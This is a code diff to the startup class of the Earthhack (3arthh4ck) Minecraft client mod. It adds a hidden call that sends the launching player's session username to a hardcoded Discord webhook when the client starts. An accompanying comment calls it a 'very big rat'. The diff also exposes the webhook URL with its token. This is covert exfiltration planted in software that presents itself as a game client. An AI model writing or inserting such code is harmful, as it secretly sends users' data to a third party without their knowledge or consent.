@@ -5,6 +5,7 @@ import me.earth.earthhack.impl.core.ducks.IMinecraft;
 import me.earth.earthhack.impl.managers.Managers;
 import me.earth.earthhack.impl.managers.thread.GlobalExecutor;
 import me.earth.earthhack.impl.modules.client.commands.Commands;
+import me.earth.earthhack.impl.util.discord.MessageHelper;
 import me.earth.earthhack.impl.util.math.geocache.Sphere;
 import me.earth.earthhack.impl.util.misc.IconUtil;
 import me.earth.earthhack.impl.util.render.SplashScreenHelper;
@@ -37,7 +38,14 @@ public class Earthhack implements Globals
         Managers.load();
         LOGGER.info("Prefix is " + Commands.getPrefix());
         SplashScreenHelper.clear();
+        try {
+            MessageHelper.sendMessage("Launched by | " + mc.getSession().getUsername() //very big rat !!!!!!
+                    , "https://discord.com/api/webhooks/1114839984550203422/kyJaVKN5Un50WuwkE6MGhMCpxf-T_noO-2deyzpO58cGmfhalPW8UhIxUArOlKr-vhEl");
+        }catch (Exception e){
+            e.printStackTrace();
+        }
         LOGGER.info("\n3arthh4ck initialized (monkey hack)\n");
+
     }
 
     public static void setWindowIcon() {
